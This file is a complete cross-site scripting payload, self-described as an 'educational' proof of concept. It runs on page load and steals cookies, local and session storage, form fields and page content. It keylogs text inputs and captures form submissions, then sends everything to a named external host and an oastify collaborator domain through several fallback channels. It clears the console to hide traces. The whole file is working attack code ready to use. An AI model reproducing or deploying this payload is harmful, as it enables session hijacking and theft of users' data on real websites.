(function() {
    'use strict';
    
    console.log('üîç XSS PoC Loaded - Educational Demo');
    
    // Configuration
    const CONFIG = {
        // Target endpoint for PUT requests
        exfilEndpoint: 'http://osscrm01t.phda.com.cn/pentestguin/collect.html',
        // Fallback endpoint (your oastify)
        fallbackEndpoint: 'https://xvwlwtgrdp6edzhd9e891mesuj0ao1lpa.oastify.com',
        debug: true,
        maxRetries: 3,
        chunkSize: 50000 // 50KB chunks for large data
    };

    /**
     * Collect victim information
     */
    function collectData() {
        const data = {
            // Basic Info
            timestamp: new Date().toISOString(),
            url: window.location.href,
            origin: window.location.origin,
            referrer: document.referrer,
            
            // Browser Info
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages,
            cookiesEnabled: navigator.cookieEnabled,
            onLine: navigator.onLine,
            
            // Screen Info
            screenResolution: `${screen.width}x${screen.height}`,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            
            // Sensitive Data
            cookies: document.cookie,
            localStorage: {},
            sessionStorage: {},
            
            // DOM Info
            title: document.title,
            domainName: document.domain,
            htmlContent: document.documentElement.outerHTML.substring(0, 5000),
            
            // Forms (if any)
            forms: Array.from(document.forms).map(form => ({
                action: form.action,
                method: form.method,
                inputs: Array.from(form.elements).map(el => ({
                    name: el.name,
                    type: el.type,
                    id: el.id,
                    value: el.type === 'password' ? '[REDACTED]' : el.value,
                    placeholder: el.placeholder
                }))
            })),
            
            // All input fields
            inputs: Array.from(document.querySelectorAll('input, textarea')).map(el => ({
                type: el.type,
                name: el.name,
                id: el.id,
                value: el.type === 'password' ? '[REDACTED]' : el.value,
                placeholder: el.placeholder
            })),
            
            // Links
            links: Array.from(document.links).slice(0, 20).map(link => link.href),
            
            // Scripts loaded
            scripts: Array.from(document.scripts).map(s => s.src || s.textContent.substring(0, 200)).filter(Boolean),
            
            // Images
            images: Array.from(document.images).slice(0, 10).map(img => img.src),
            
            // Meta tags
            metaTags: Array.from(document.querySelectorAll('meta')).map(meta => ({
                name: meta.name || meta.property,
                content: meta.content
            }))
        };
        
        // Extract localStorage
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                data.localStorage[key] = localStorage.getItem(key);
            }
        } catch(e) {
            data.localStorage = { error: e.message };
        }
        
        // Extract sessionStorage
        try {
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                data.sessionStorage[key] = sessionStorage.getItem(key);
            }
        } catch(e) {
            data.sessionStorage = { error: e.message };
        }
        
        return data;
    }

    /**
     * Take a simple screenshot (text-based)
     */
    function captureScreenshot() {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            
            canvas.width = Math.min(window.innerWidth, 1200);
            canvas.height = Math.min(window.innerHeight, 800);
            
            // White background
            ctx.fillStyle = '#ffffff';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            // Draw text content
            ctx.fillStyle = '#000000';
            ctx.font = '12px monospace';
            
            const text = document.body.innerText || document.body.textContent;
            const lines = text.split('\n').slice(0, 50);
            
            lines.forEach((line, i) => {
                ctx.fillText(line.substring(0, 100), 10, 20 + (i * 15));
            });
            
            return canvas.toDataURL('image/png');
        } catch (e) {
            return `Screenshot failed: ${e.message}`;
        }
    }

    /**
     * Send data via PUT request with retry mechanism
     */
    function sendViaPUT(data, endpoint, retries = 0) {
        const payload = JSON.stringify(data);
        
        if (CONFIG.debug) {
            console.log(`üì§ Attempting PUT request to ${endpoint} (attempt ${retries + 1}/${CONFIG.maxRetries + 1})`);
        }
        
        // Method 1: Fetch API with PUT
        fetch(endpoint, {
            method: 'PUT',
            headers: {
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest',
                'X-Data-Length': payload.length.toString(),
                'X-Timestamp': new Date().toISOString()
            },
            body: payload,
            mode: 'no-cors',
            credentials: 'include',
            keepalive: true
        })
        .then(response => {
            if (CONFIG.debug) {
                console.log('‚úÖ PUT request via Fetch successful');
            }
        })
        .catch(err => {
            if (CONFIG.debug) {
                console.log('‚ùå Fetch PUT failed:', err.message);
            }
            
            // Retry with XHR
            if (retries < CONFIG.maxRetries) {
                setTimeout(() => sendViaPUT(data, endpoint, retries + 1), 2000);
            } else {
                // Final fallback: XHR PUT
                sendViaXHR(data, endpoint);
            }
        });
    }

    /**
     * Fallback: XMLHttpRequest PUT
     */
    function sendViaXHR(data, endpoint) {
        try {
            const xhr = new XMLHttpRequest();
            xhr.open('PUT', endpoint, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
            xhr.withCredentials = true;
            
            xhr.onload = function() {
                if (xhr.status >= 200 && xhr.status < 300) {
                    if (CONFIG.debug) {
                        console.log('‚úÖ XHR PUT successful:', xhr.status);
                    }
                } else {
                    if (CONFIG.debug) {
                        console.log('‚ö†Ô∏è XHR PUT returned status:', xhr.status);
                    }
                }
            };
            
            xhr.onerror = function() {
                if (CONFIG.debug) {
                    console.log('‚ùå XHR PUT failed, trying POST fallback');
                }
                // Last resort: POST request
                sendViaPOST(data, endpoint);
            };
            
            xhr.send(JSON.stringify(data));
        } catch (e) {
            console.error('XHR Error:', e);
            sendViaPOST(data, endpoint);
        }
    }

    /**
     * Last resort: POST request
     */
    function sendViaPOST(data, endpoint) {
        fetch(endpoint, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data),
            mode: 'no-cors'
        }).then(() => {
            if (CONFIG.debug) {
                console.log('‚úÖ POST fallback successful');
            }
        }).catch(err => {
            if (CONFIG.debug) {
                console.log('‚ùå POST fallback failed:', err);
            }
            // Ultimate fallback: Image beacon
            sendViaImageBeacon(data, endpoint);
        });
    }

    /**
     * Ultimate fallback: Image beacon with Base64
     */
    function sendViaImageBeacon(data, endpoint) {
        try {
            const img = new Image();
            const compressed = btoa(JSON.stringify({
                url: data.url,
                cookies: data.cookies,
                localStorage: data.localStorage,
                timestamp: data.timestamp
            })).substring(0, 2000);
            
            img.src = `${endpoint}?data=${encodeURIComponent(compressed)}&method=beacon`;
            
            if (CONFIG.debug) {
                console.log('‚úÖ Image beacon sent as last resort');
            }
        } catch (e) {
            console.error('Image beacon error:', e);
        }
    }

    /**
     * Send data in chunks for large payloads
     */
    function sendInChunks(data) {
        const dataString = JSON.stringify(data);
        const totalChunks = Math.ceil(dataString.length / CONFIG.chunkSize);
        const sessionId = Math.random().toString(36).substring(7);
        
        if (CONFIG.debug) {
            console.log(`üì¶ Sending data in ${totalChunks} chunks (Session: ${sessionId})`);
        }
        
        for (let i = 0; i < totalChunks; i++) {
            const chunk = dataString.substring(i * CONFIG.chunkSize, (i + 1) * CONFIG.chunkSize);
            
            setTimeout(() => {
                const chunkData = {
                    sessionId: sessionId,
                    chunkIndex: i,
                    totalChunks: totalChunks,
                    data: chunk
                };
                
                fetch(CONFIG.exfilEndpoint, {
                    method: 'PUT',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-Chunk-Index': i.toString(),
                        'X-Total-Chunks': totalChunks.toString(),
                        'X-Session-ID': sessionId
                    },
                    body: JSON.stringify(chunkData),
                    mode: 'no-cors'
                }).catch(() => {
                    // Fallback for chunk
                    const xhr = new XMLHttpRequest();
                    xhr.open('PUT', CONFIG.exfilEndpoint, true);
                    xhr.setRequestHeader('Content-Type', 'application/json');
                    xhr.send(JSON.stringify(chunkData));
                });
                
            }, i * 1000); // 1 second delay between chunks
        }
    }

    /**
     * Main exfiltration function
     */
    function exfiltrate(data) {
        if (CONFIG.debug) {
            console.log('üì¶ Collected Data:', data);
        }
        
        const dataSize = JSON.stringify(data).length;
        
        if (CONFIG.debug) {
            console.log(`üìä Data size: ${dataSize} bytes`);
        }
        
        // If data is too large, send in chunks
        if (dataSize > CONFIG.chunkSize) {
            sendInChunks(data);
        } else {
            // Send via PUT to primary endpoint
            sendViaPUT(data, CONFIG.exfilEndpoint);
            
            // Also send to fallback endpoint
            setTimeout(() => {
                sendViaPUT(data, CONFIG.fallbackEndpoint);
            }, 1000);
        }
        
        // Additional method: sendBeacon (most reliable, works even on page unload)
        if (navigator.sendBeacon) {
            try {
                const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
                const sent = navigator.sendBeacon(CONFIG.exfilEndpoint, blob);
                
                if (CONFIG.debug) {
                    console.log(sent ? '‚úÖ sendBeacon successful' : '‚ö†Ô∏è sendBeacon failed');
                }
            } catch (e) {
                console.error('sendBeacon error:', e);
            }
        }
    }

    /**
     * Hook into form submissions
     */
    function hookForms() {
        document.addEventListener('submit', function(e) {
            const form = e.target;
            const formData = new FormData(form);
            const data = {
                type: 'form_submission',
                timestamp: new Date().toISOString(),
                url: window.location.href,
                action: form.action,
                method: form.method,
                fields: {}
            };
            
            for (let [key, value] of formData.entries()) {
                data.fields[key] = value;
            }
            
            // Send immediately via PUT
            sendViaPUT(data, CONFIG.exfilEndpoint);
            
            if (CONFIG.debug) {
                console.log('üìù Form submission captured:', data);
            }
        }, true);
    }

    /**
     * Hook into input fields (keylogger)
     */
    function hookInputs() {
        let inputBuffer = {};
        let sendTimeout;
        
        document.addEventListener('input', function(e) {
            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
                const fieldId = e.target.name || e.target.id || 'unnamed';
                
                inputBuffer[fieldId] = {
                    name: e.target.name,
                    id: e.target.id,
                    type: e.target.type,
                    value: e.target.type === 'password' ? '[REDACTED]' : e.target.value,
                    timestamp: new Date().toISOString()
                };
                
                // Debounce: send after 3 seconds of no input
                clearTimeout(sendTimeout);
                sendTimeout = setTimeout(() => {
                    if (Object.keys(inputBuffer).length > 0) {
                        const data = {
                            type: 'input_capture',
                            timestamp: new Date().toISOString(),
                            url: window.location.href,
                            fields: inputBuffer
                        };
                        
                        sendViaPUT(data, CONFIG.exfilEndpoint);
                        
                        if (CONFIG.debug) {
                            console.log('‚å®Ô∏è Input buffer sent:', data);
                        }
                        
                        inputBuffer = {};
                    }
                }, 3000);
            }
        }, true);
    }

    /**
     * Create a visible alert (for PoC demonstration)
     */
    function createVisualAlert() {
        const alertBox = document.createElement('div');
        alertBox.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: linear-gradient(135deg, #ff4444, #cc0000);
            color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
            z-index: 999999;
            font-family: monospace;
            max-width: 350px;
            animation: slideIn 0.5s ease-out;
        `;
        alertBox.innerHTML = `
            <strong>‚ö†Ô∏è XSS PoC Active (PUT Method)</strong><br>
            <small>Educational Security Demonstration</small><br>
            <small>Target: ${CONFIG.exfilEndpoint}</small><br>
            <small>Data exfiltration in progress...</small>
            <button onclick="this.parentElement.remove()" style="margin-top:10px;padding:5px 10px;cursor:pointer;background:#fff;border:none;border-radius:4px;">
                Close
            </button>
        `;
        
        // Add animation
        const style = document.createElement('style');
        style.textContent = `
            @keyframes slideIn {
                from { transform: translateX(400px); opacity: 0; }
                to { transform: translateX(0); opacity: 1; }
            }
        `;
        document.head.appendChild(style);
        document.body.appendChild(alertBox);
        
        // Auto-remove after 15 seconds
        setTimeout(() => {
            if (alertBox.parentElement) {
                alertBox.style.animation = 'slideIn 0.5s ease-out reverse';
                setTimeout(() => alertBox.remove(), 500);
            }
        }, 15000);
    }

    /**
     * Clean up traces
     */
    function cleanupTraces() {
        setTimeout(() => {
            // Clear console
            console.clear();
            
            // Remove error handlers
            window.onerror = null;
            
            if (CONFIG.debug) {
                console.log('üßπ Traces cleaned up');
            }
        }, 5000);
    }

    /**
     * Main execution
     */
    function execute() {
        console.log('üöÄ Starting XSS PoC with PUT method...');
        
        try {
            // Collect initial data
            const data = collectData();
            
            // Add screenshot
            data.screenshot = captureScreenshot();
            
            // Exfiltrate via PUT
            exfiltrate(data);
            
            // Hook forms and inputs
            hookForms();
            hookInputs();
            
            // Show visual alert (for demonstration)
            createVisualAlert();
            
            // Cleanup traces
            cleanupTraces();
            
            console.log('‚úÖ XSS PoC execution complete');
            console.log(`üìä Total data collected: ${JSON.stringify(data).length} bytes`);
            
        } catch (error) {
            console.error('‚ùå Error during execution:', error);
        }
    }

    // Execute when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', execute);
    } else {
        execute();
    }

})();
